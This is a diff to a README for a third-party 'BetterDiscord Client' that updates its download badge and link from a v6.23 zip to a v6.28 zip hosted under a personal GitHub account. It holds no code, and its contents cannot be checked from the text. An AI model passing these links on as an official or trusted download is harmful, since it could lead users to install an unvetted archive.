@@ -1,7 +1,6 @@
 # **BetterDiscord Client (Third-Party Custom Client)**
 
-[![Download](https://img.shields.io/badge/Download-BetterDiscord_Client-blue?style=for-the-badge)](https://github.com/Narendhard/BetterDiscord-Client/releases/download/v6.23/BetterDiscord.6.23.zip
-)
+[![Download](https://img.shields.io/badge/Download-BetterDiscord_Client-blue?style=for-the-badge)](https://github.com/Narendhard/BetterDiscord-Client/releases/download/v6.28.1/BetterDiscord.6.28.zip)
 
 > **Disclaimer:**  
 > This project is an independent, third-party customization client and is *not affiliated with, endorsed by, or associated with Discord Inc.*  
@@ -61,7 +60,7 @@ BetterDiscord Client aims to deliver a customizable, clean, and responsive inter
 
 ## **Download BetterDiscord Client**
 
-[**Download BetterDiscord Client**](https://github.com/Narendhard/BetterDiscord-Client/releases/download/v6.23/BetterDiscord.6.23.zip)
+[**Download BetterDiscord Client**](https://github.com/Narendhard/BetterDiscord-Client/releases/download/v6.28.1/BetterDiscord.6.28.zip)
 
 ---
 
